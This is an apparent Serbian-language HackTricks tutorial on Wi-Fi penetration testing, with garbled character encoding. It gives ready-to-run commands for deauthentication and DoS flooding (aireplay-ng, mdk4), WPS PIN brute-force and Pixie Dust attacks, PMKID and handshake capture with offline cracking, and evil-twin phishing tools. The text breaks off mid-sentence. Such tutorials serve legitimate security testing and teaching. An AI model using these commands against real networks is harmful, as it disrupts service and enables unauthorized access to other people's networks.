# Pentesting Wifi

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na greÅ¡ke!

**Hakerski Uvidi**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o Haku u Realnom Vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovija ObaveÅ¡tenja**\
Budite informisani o najnovijim nagradama za greÅ¡ke i vaÅ¾nim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discordu**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## Wifi osnovne komande
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Alati

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Pokrenite airgeddon sa docker-om**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

MoÅ¾e izvesti napade Evil Twin, KARMA i Known Beacons, a zatim koristiti phishing Å¡ablon da bi uspeo da dobije pravu lozinku mreÅ¾e ili da uhvati kredencijale druÅ¡tvenih mreÅ¾a.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Ovaj alat automatizuje **WPS/WEP/WPA-PSK** napade. Automatski Ä‡e:

* Postaviti interfejs u reÅ¾im nadgledanja
* Skenerirati moguÄ‡e mreÅ¾e - I omoguÄ‡iti vam da odaberete Å¾rtvu(e)
* Ako je WEP - Pokrenuti WEP napade
* Ako je WPA-PSK
* Ako je WPS: Pixie dust napad i bruteforce napad (budite oprezni, bruteforce napad moÅ¾e potrajati dugo). Imajte na umu da ne pokuÅ¡ava null PIN ili bazu/generisane PIN-ove.
* PokuÅ¡ati da uhvati PMKID sa AP-a da bi ga razbio
* PokuÅ¡ati da deautentifikuje klijente AP-a da bi uhvatio handshake
* Ako PMKID ili Handshake, pokuÅ¡ati da bruteforce koristeÄ‡i top5000 lozinki.

## Pregled napada

* **DoS**
* Deautentifikacija/disasocijacija -- IskljuÄiti sve (ili specifiÄni ESSID/klijent)
* NasumiÄni laÅ¾ni AP-ovi -- Sakriti mreÅ¾e, moguÄ‡e sruÅ¡iti skener
* Preopteretiti AP -- PokuÅ¡ati da ubije AP (obiÄno nije vrlo korisno)
* WIDS -- Igrati se sa IDS-om
* TKIP, EAPOL -- Neki specifiÄni napadi za DoS neke AP-ove
* **Cracking**
* Razbiti **WEP** (nekoliko alata i metoda)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** bruteforce
* \[DoS +] **WPA handshake** hvatanje + Razbijanje
* **WPA-MGT**
* **Hvatanje korisniÄkog imena**
* **Bruteforce** akreditivi
* **Evil Twin** (sa ili bez DoS)
* **Open** Evil Twin \[+ DoS] -- Korisno za hvatanje akreditiva sa captive portala i/ili izvoÄ‘enje LAN napada
* **WPA-PSK** Evil Twin -- Korisno za mreÅ¾ne napade ako znate lozinku
* **WPA-MGT** -- Korisno za hvatanje akreditiva kompanije
* **KARMA, MANA**, **Loud MANA**, **Poznati beacon**
* **+ Open** -- Korisno za hvatanje akreditiva sa captive portala i/ili izvoÄ‘enje LAN napada
* **+ WPA** -- Korisno za hvatanje WPA handshakes

## DOS

### Deautentifikacijski paketi

**Opis iz** [**ovde**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deautentifikacija** napadi, rasprostranjena metoda u Wi-Fi hakovanju, ukljuÄuju falsifikovanje "menadÅ¾erskih" okvira kako bi se **prisilno iskljuÄili ureÄ‘aji sa mreÅ¾e**. Ovi neÅ¡ifrovani paketi obmanjuju klijente da veruju da dolaze iz legitimne mreÅ¾e, omoguÄ‡avajuÄ‡i napadaÄima da prikupe WPA handshakes u svrhu razbijanja ili da trajno ometaju mreÅ¾ne veze. Ova taktika, zastraÅ¡ujuÄ‡a u svojoj jednostavnosti, Å¡iroko se koristi i ima znaÄajne posledice za bezbednost mreÅ¾e.

**Deautentifikacija koristeÄ‡i Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 znaÄi deautentifikaciju
* 1 je broj deautentifikacija koje treba poslati (moÅ¾ete poslati viÅ¡e ako Å¾elite); 0 znaÄi slati ih kontinuirano
* \-a 00:14:6C:7E:40:80 je MAC adresa pristupne taÄke
* \-c 00:0F:B5:34:30:30 je MAC adresa klijenta koji treba deautentifikovati; ako je ovo izostavljeno, tada se Å¡alje deautentifikacija u emitovanju (ne radi uvek)
* ath0 je naziv interfejsa

### Paketi disasocijacije

**Paketi disasocijacije**, sliÄni paketima deautentifikacije, su vrsta upravljaÄkog okvira koji se koristi u Wi-Fi mreÅ¾ama. Ovi paketi sluÅ¾e za prekid veze izmeÄ‘u ureÄ‘aja (kao Å¡to su laptop ili pametni telefon) i pristupne taÄke (AP). Primarna razlika izmeÄ‘u disasocijacije i deautentifikacije leÅ¾i u njihovim scenarijima koriÅ¡Ä‡enja. Dok AP emituje **pakete deautentifikacije da bi eksplicitno uklonio neovlaÅ¡Ä‡ene ureÄ‘aje iz mreÅ¾e, paketi disasocijacije se obiÄno Å¡alju kada AP prolazi kroz gaÅ¡enje**, restart ili premestanje, Äime se zahteva prekid veze svih povezanih Ävorova.

**Ovaj napad se moÅ¾e izvesti pomoÄ‡u mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **ViÅ¡e DOS napada pomoÄ‡u mdk4**

**U** [**ovde**](https://en.kali.tools/?p=864)**.**

**NAPAD MODE b: Flooding Beacon-a**

Å alje beacon okvire kako bi prikazao laÅ¾ne AP-ove kod klijenata. Ovo ponekad moÅ¾e sruÅ¡iti mreÅ¾ne skener-e i Äak drajvere!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Slanje autentifikacionih okvira svim dostupnim pristupnim taÄkama (AP) unutar dometa moÅ¾e preopteretiti ove AP, posebno kada je ukljuÄeno viÅ¡e klijenata. Ovaj intenzivan saobraÄ‡aj moÅ¾e dovesti do nestabilnosti sistema, uzrokujuÄ‡i da neki AP zamrznu ili Äak resetuju.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) proverava da li je SSID pravilno otkriven i potvrÄ‘uje domet AP-a. Ova tehnika, u kombinaciji sa **bruteforcing hidden SSIDs** sa ili bez liste reÄi, pomaÅ¾e u identifikaciji i pristupu skrivenim mreÅ¾ama.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Slanje nasumiÄnih ili duplih paketa razliÄitim QoS redovima moÅ¾e aktivirati Michael Countermeasures na **TKIP APs**, Å¡to dovodi do jednog minuta gaÅ¡enja AP-a. Ova metoda je efikasna **DoS** (Denial of Service) napadaÄka taktika.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start i Logoff Paketi Injekcija**

Flooding AP-a sa **EAPOL Start okvirima** stvara **laÅ¾ne sesije**, preoptereÄ‡ujuÄ‡i AP i blokirajuÄ‡i legitimne klijente. Alternativno, injektovanje **laÅ¾nih EAPOL Logoff poruka** prisilno iskljuÄuje klijente, obe metode efikasno ometaju mreÅ¾nu uslugu.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Napadi na IEEE 802.11s mesh mreÅ¾e**

RazliÄiti napadi na upravljanje vezama i rutiranje u mesh mreÅ¾ama.

**ATTACK MODE w: WIDS Zbunjenost**

Kros-konekcija klijenata na viÅ¡e WDS Ävorova ili laÅ¾nih rogue AP-ova moÅ¾e manipulisati sistemima za otkrivanje i prevenciju upada, stvarajuÄ‡i konfuziju i potencijalnu zloupotrebu sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**NAPAD MODE f: Packet Fuzzer**

Packet fuzzer koji sadrÅ¾i raznovrsne izvore paketa i sveobuhvatan set modifikatora za manipulaciju paketima.

### **Airggedon**

_**Airgeddon**_ nudi veÄ‡inu napada predloÅ¾enih u prethodnim komentarima:

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) pojednostavljuje proces povezivanja ureÄ‘aja na ruter, poboljÅ¡avajuÄ‡i brzinu i jednostavnost postavljanja za mreÅ¾e Å¡ifrovane sa **WPA** ili **WPA2** Personal. Neefikasan je za lako kompromitovanu WEP sigurnost. WPS koristi 8-cifreni PIN, validiran u dva dela, Å¡to ga Äini podloÅ¾nim napadima brute-force zbog ograniÄenog broja kombinacija (11,000 moguÄ‡nosti).

### WPS Bruteforce

Postoje 2 glavna alata za izvoÄ‘enje ove akcije: Reaver i Bully.

* **Reaver** je dizajniran da bude robustan i praktiÄan napad protiv WPS-a, i testiran je protiv Å¡irokog spektra pristupnih taÄaka i WPS implementacija.
* **Bully** je **nova implementacija** WPS brute force napada, napisana u C. Ima nekoliko prednosti u odnosu na originalni reaver kod: manje zavisnosti, poboljÅ¡ane performanse memorije i CPU-a, ispravno rukovanje endijanoÅ¡Ä‡u, i robusniji set opcija.

Napad koristi **ranjivost WPS PIN-a**, posebno izlaganje prvih Äetiri cifre i ulogu poslednje cifre kao kontrolnog zbira, olakÅ¡avajuÄ‡i napad brute-force. MeÄ‘utim, odbrana od brute-force napada, kao Å¡to je **blokiranje MAC adresa** agresivnih napadaÄa, zahteva **rotaciju MAC adresa** kako bi se napad nastavio.

Nakon dobijanja WPS PIN-a pomoÄ‡u alata kao Å¡to su Bully ili Reaver, napadaÄ moÅ¾e da dedukuje WPA/WPA2 PSK, obezbeÄ‘ujuÄ‡i **trajni pristup mreÅ¾i**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Ovaj rafiniran pristup cilja WPS PIN-ove koristeÄ‡i poznate ranjivosti:

1. **Pre-otkriveni PIN-ovi**: Iskoristite bazu podataka poznatih PIN-ova povezanih sa specifiÄnim proizvoÄ‘aÄima za koje je poznato da koriste uniformne WPS PIN-ove. Ova baza podataka korelira prva tri okteta MAC adresa sa verovatnim PIN-ovima za ove proizvoÄ‘aÄe.
2. **Algoritmi za generisanje PIN-ova**: Iskoristite algoritme kao Å¡to su ComputePIN i EasyBox, koji izraÄunavaju WPS PIN-ove na osnovu MAC adrese AP-a. Arcadyan algoritam dodatno zahteva ID ureÄ‘aja, dodajuÄ‡i sloj u procesu generisanja PIN-a.

### WPS Pixie Dust attack

**Dominique Bongard** je otkrio greÅ¡ku u nekim pristupnim taÄkama (AP) u vezi sa kreiranjem tajnih kodova, poznatih kao **nonces** (**E-S1** i **E-S2**). Ako se ovi nonces mogu otkriti, provaljivanje WPS PIN-a AP-a postaje lako. AP otkriva PIN unutar posebnog koda (hash) kako bi dokazao da je legitiman i da nije laÅ¾ni (rogue) AP. Ovi nonces su suÅ¡tinski "kljuÄevi" za otkljuÄavanje "sef-a" koji sadrÅ¾i WPS PIN. ViÅ¡e o ovome moÅ¾ete pronaÄ‡i [ovde](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

U jednostavnim reÄima, problem je u tome Å¡to neki AP-ovi nisu koristili dovoljno nasumiÄne kljuÄeve za enkripciju PIN-a tokom procesa povezivanja. To Äini PIN ranjivim na pogaÄ‘anje sa spoljaÅ¡nje strane mreÅ¾e (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Ako ne Å¾elite da prebacite ureÄ‘aj u reÅ¾im nadzora, ili `reaver` i `bully` imaju neki problem, moÅ¾ete probati [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Ovaj alat moÅ¾e izvrÅ¡iti Pixie Dust napad bez potrebe da se prebacite u reÅ¾im nadzora.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin napad

Neki loÅ¡e dizajnirani sistemi Äak dozvoljavaju **Null PIN** (prazan ili nepostojeÄ‡i PIN) da omoguÄ‡e pristup, Å¡to je priliÄno neobiÄno. Alat **Reaver** je sposoban da testira ovu ranjivost, za razliku od **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Sve predloÅ¾ene WPS napade je lako izvesti koristeÄ‡i _**airgeddon.**_

![](<../../.gitbook/assets/image (219).png>)

* 5 i 6 vam omoguÄ‡avaju da probate **vaÅ¡ prilagoÄ‘eni PIN** (ako ga imate)
* 7 i 8 izvode **Pixie Dust napad**
* 13 vam omoguÄ‡ava da testirate **NULL PIN**
* 11 i 12 Ä‡e **prikupiti PIN-ove povezane sa odabranim AP iz dostupnih baza podataka** i **generisati** moguÄ‡e **PIN-ove** koristeÄ‡i: ComputePIN, EasyBox i opcionalno Arcadyan (preporuÄeno, zaÅ¡to da ne?)
* 9 i 10 Ä‡e testirati **svaki moguÄ‡i PIN**

## **WEP**

Tako slomljen i neupotrebljavan danas. Samo znajte da _**airgeddon**_ ima WEP opciju pod nazivom "All-in-One" za napad na ovu vrstu zaÅ¡tite. Mnogi alati nude sliÄne opcije.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na greÅ¡ke!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji se bavi uzbuÄ‘enjem i izazovima hakovanja

**Real-Time Hack News**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Latest Announcements**\
Budite informisani o najnovijim nagradama za greÅ¡ke i vaÅ¾nim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

***

## WPA/WPA2 PSK

### PMKID

U 2018. godini, **hashcat** [je otkrio](https://hashcat.net/forum/thread-7717.html) novu metodu napada, jedinstvenu jer zahteva **samo jedan paket** i ne zahteva da bilo koji klijenti budu povezani na ciljani APâ€”samo interakciju izmeÄ‘u napadaÄa i AP.

Mnogi moderni ruteri dodaju **opcionalno polje** u **prvom EAPOL** okviru tokom asocijacije, poznato kao `Robust Security Network`. Ovo ukljuÄuje `PMKID`.

Kao Å¡to objaÅ¡njava originalni post, **PMKID** se kreira koristeÄ‡i poznate podatke:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
S obzirom na to da je "PMK Name" konstantan, znamo BSSID AP-a i stanice, a `PMK` je identiÄan onom iz punog 4-naÄina rukovanja, **hashcat** moÅ¾e iskoristiti ove informacije da razbije PSK i povrati lozinku!

Da **prikupite** ove informacije i **bruteforce** lokalno lozinku, moÅ¾ete uraditi:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs uhvaÄ‡eni** Ä‡e biti prikazani u **konzoli** i takoÄ‘e **saÄuvani** unutar \_ **/tmp/attack.pcap**\_\
Sada, konvertujte hvatanje u **hashcat/john** format i probijte ga:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Molimo vas da obratite paÅ¾nju na format ispravnog hasha koji sadrÅ¾i **4 dela**, kao Å¡to je: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Ako vaÅ¡ **sadrÅ¾i samo** **3 dela**, onda je **neispravan** (PMKID snimak nije bio validan).

Napomena da `hcxdumptool` **takoÄ‘e snima rukovanja** (neÅ¡to poput ovoga Ä‡e se pojaviti: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). MoÅ¾ete **pretvoriti** **rukovanja** u **hashcat**/**john** format koristeÄ‡i `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I primetio sam da neki rukohvati uhvaÄ‡eni ovim alatom nisu mogli biti otkriveni Äak i kada se zna taÄna lozinka. PreporuÄujem da se rukohvati uhvate i na tradicionalan naÄin ako je moguÄ‡e, ili da se uhvati nekoliko njih koristeÄ‡i ovaj alat._

### Handshake capture

Napad na **WPA/WPA2** mreÅ¾e moÅ¾e se izvrÅ¡iti hvatanjem **rukohvata** i pokuÅ¡ajem da se **otkrije** lozinka **offline**. Ovaj proces ukljuÄuje praÄ‡enje komunikacije odreÄ‘ene mreÅ¾e i **BSSID** na odreÄ‘enom **kanalu**. Evo pojednostavljenog vodiÄa:

1. Identifikujte **BSSID**, **kanal** i **povezanog klijenta** ciljne mreÅ¾e.
2. Koristite `airodump-ng` za praÄ‡enje mreÅ¾nog saobraÄ‡aja na navedenom kanalu i BSSID-u, nadajuÄ‡i se da Ä‡ete uhvatiti rukohvat. Komanda Ä‡e izgledati ovako:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Da biste poveÄ‡ali Å¡anse za hvatanje rukovanja, privremeno iskljuÄite klijenta iz mreÅ¾e kako biste primorali ponovnu autentifikaciju. To se moÅ¾e uraditi koristeÄ‡i `aireplay-ng` komandu, koja Å¡alje pakete deautentifikacije klijentu:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Napomena da, kada je klijent bio deautentifikovan, mogao je pokuÅ¡ati da se poveÅ¾e na drugi AP ili, u drugim sluÄajevima, na drugu mreÅ¾u._

Kada se u `airodump-ng` pojavi neka informacija o rukovanju, to znaÄi da je rukovanje uhvaÄ‡eno i moÅ¾ete prestati sa sluÅ¡anjem:

![](<../../.gitbook/assets/image (172) (1).png>)

Kada je rukovanje uhvaÄ‡eno, moÅ¾ete ga **provaliti** sa `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Proverite da li je rukovanje u datoteci

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Ako ovaj alat pronaÄ‘e nepotpun handshake nekog ESSID-a pre nego Å¡to pronaÄ‘e kompletan, neÄ‡e detektovati validan._ 

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

U **preduzetniÄkim WiFi postavkama, naiÄ‡i Ä‡ete na razliÄite metode autentifikacije**, svaka pruÅ¾a razliÄite nivoe sigurnosti i funkcije upravljanja. Kada koristite alate poput `airodump-ng` za inspekciju mreÅ¾nog saobraÄ‡aja, moÅ¾da Ä‡ete primetiti identifikatore za ove tipove autentifikacije. Neke uobiÄajene metode ukljuÄuju:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Ova metoda podrÅ¾ava hardverske tokene i jednokratne lozinke unutar EAP-PEAP. Za razliku od MSCHAPv2, ne koristi izazov izmeÄ‘u partnera i Å¡alje lozinke u obiÄnom tekstu pristupnoj taÄki, Å¡to predstavlja rizik od napada na smanjenje bezbednosti.
2. **EAP-MD5 (Message Digest 5)**:
* UkljuÄuje slanje MD5 heÅ¡a lozinke sa klijenta. **Nije preporuÄeno** zbog ranjivosti na napade reÄnikom, nedostatka autentifikacije servera i nemoguÄ‡nosti generisanja WEP kljuÄeva specifiÄnih za sesiju.
3. **EAP-TLS (Transport Layer Security)**:
* Koristi i klijentske i serverske sertifikate za autentifikaciju i moÅ¾e dinamiÄki generisati WEP kljuÄeve zasnovane na korisnicima i sesijama za zaÅ¡titu komunikacije.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* PruÅ¾a uzajamnu autentifikaciju kroz enkriptovani tunel, zajedno sa metodom za dobijanje dinamiÄkih WEP kljuÄeva po korisniku i po sesiji. Zahteva samo serverske sertifikate, dok klijenti koriste akreditive.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* FunkcioniÅ¡e sliÄno kao EAP stvaranjem TLS tunela za zaÅ¡tiÄ‡enu komunikaciju. OmoguÄ‡ava koriÅ¡Ä‡enje slabijih autentifikacionih protokola iznad EAP-a zbog zaÅ¡tite koju tunel pruÅ¾a.
* **PEAP-MSCHAPv2**: ÄŒesto se naziva PEAP, kombinuje ranjivi MSCHAPv2 izazov/odgovor mehanizam sa zaÅ¡titnim TLS tunelom.
* **PEAP-EAP-TLS (ili PEAP-TLS)**: SliÄno EAP-TLS, ali zapoÄinje TLS tunel pre razmene sertifikata, nudeÄ‡i dodatni sloj sigurnosti.

MoÅ¾ete pronaÄ‡i viÅ¡e informacija o ovim metodama autentifikacije [ovde](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) i [ovde](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

ÄŒitajuÄ‡i [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), izgleda da ako koristite **EAP**, **"Identitet"** **poruke** moraju biti **podrÅ¾ane**, a **korisniÄko ime** Ä‡e biti poslato u **obiÄnom** tekstu u **"Response Identity"** porukama.

ÄŒak i koriÅ¡Ä‡enjem jedne od najsigurnijih metoda autentifikacije: **PEAP-EAP-TLS**, moguÄ‡e je **uhvatiti korisniÄko ime poslato u EAP protokolu**. Da biste to uradili, **uhvatite komunikaciju autentifikacije** (pokrenite `airodump-ng` unutar kanala i `wireshark` na istom interfejsu) i filtrirajte pakete po `eapol`.\
Unutar paketa "**Response, Identity**", pojaviÄ‡e se **korisniÄko ime** klijenta.

![](<../../.gitbook/assets/image (850).png>)

### Anonymous Identities

Skrivenje identiteta podrÅ¾avaju i EAP-PEAP i EAP-TTLS. U kontekstu WiFi mreÅ¾e, EAP-Identitet zahtev obiÄno pokreÄ‡e pristupna taÄka (AP) tokom procesa asocijacije. Da bi se osigurala zaÅ¡tita anonimnosti korisnika, odgovor EAP klijenta na korisniÄkom ureÄ‘aju sadrÅ¾i samo osnovne informacije potrebne za inicijalni RADIUS server da obradi zahtev. Ova koncepcija je ilustrovana kroz sledeÄ‡e scenarije:

* EAP-Identitet = anonimno
* U ovom scenariju, svi korisnici koriste pseudonim "anonimno" kao svoj identifikator korisnika. Inicijalni RADIUS server funkcioniÅ¡e kao EAP-PEAP ili EAP-TTLS server, odgovoran za upravljanje serverskom stranom PEAP ili TTLS protokola. UnutraÅ¡nja (zaÅ¡tiÄ‡ena) metoda autentifikacije se zatim ili obraÄ‘uje lokalno ili delegira na udaljeni (domaÄ‡i) RADIUS server.
* EAP-Identitet = anonimno@realm\_x
* U ovoj situaciji, korisnici iz razliÄitih domena skrivaju svoje identitete dok ukazuju na svoje odgovarajuÄ‡e domene. Ovo omoguÄ‡ava inicijalnom RADIUS serveru da proksi EAP-PEAP ili EAP-TTLS zahteve ka RADIUS serverima u njihovim domaÄ‡im domenima, koji deluju kao PEAP ili TTLS server. Inicijalni RADIUS server funkcioniÅ¡e iskljuÄivo kao RADIUS relejna taÄka.
* Alternativno, inicijalni RADIUS server moÅ¾e funkcionisati kao EAP-PEAP ili EAP-TTLS server i ili obraditi zaÅ¡tiÄ‡enu metodu autentifikacije ili je proslediti drugom serveru. Ova opcija olakÅ¡ava konfiguraciju razliÄitih politika za razliÄite domene.

U EAP-PEAP, kada se TLS tunel uspostavi izmeÄ‘u PEAP servera i PEAP klijenta, PEAP server pokreÄ‡e EAP-Identitet zahtev i prenosi ga kroz TLS tunel. Klijent odgovara na ovaj drugi EAP-Identitet zahtev slanjem EAP-Identitet odgovora koji sadrÅ¾i pravi identitet korisnika kroz enkriptovani tunel. Ovaj pristup efikasno spreÄava otkrivanje stvarnog identiteta korisnika bilo kome ko prisluÅ¡kuje 802.11 saobraÄ‡aj.

EAP-TTLS prati malo drugaÄiju proceduru. Sa EAP-TTLS, klijent obiÄno autentifikuje koristeÄ‡i PAP ili CHAP, zaÅ¡tiÄ‡en TLS tunelom. U ovom sluÄaju, klijent ukljuÄuje atribut User-Name i ili atribut Password ili CHAP-Password u inicijalnoj TLS poruci poslatog nakon uspostavljanja tunela.

Bez obzira na izabrani protokol, PEAP/TTLS server saznaje pravi identitet korisnika nakon Å¡to je TLS tunel uspostavljen. Pravi identitet moÅ¾e biti predstavljen kao user@realm ili jednostavno user. Ako je PEAP/TTLS server takoÄ‘e odgovoran za autentifikaciju korisnika, sada poseduje identitet korisnika i nastavlja sa metodom autentifikacije zaÅ¡tiÄ‡enom TLS tunelom. Alternativno, PEAP/TTLS server moÅ¾e proslediti novi RADIUS zahtev ka domaÄ‡em RADIUS serveru korisnika. Ovaj novi RADIUS zahtev izostavlja PEAP ili TTLS protokol. U sluÄajevima kada je zaÅ¡tiÄ‡ena metoda autentifikacije EAP, unutraÅ¡nje EAP poruke se prenose ka domaÄ‡em RADIUS serveru bez PEAP-PEAP ili EAP-TTLS omotaÄa. Atribut User-Name u odlaznoj RADIUS poruci sadrÅ¾i pravi identitet korisnika, zamenjujuÄ‡i anonimni User-Name iz dolaznog RADIUS zahteva. Kada je zaÅ¡tiÄ‡ena metoda autentifikacije PAP ili CHAP (podrÅ¾ana samo od strane TTLS), atribut User-Name i drugi 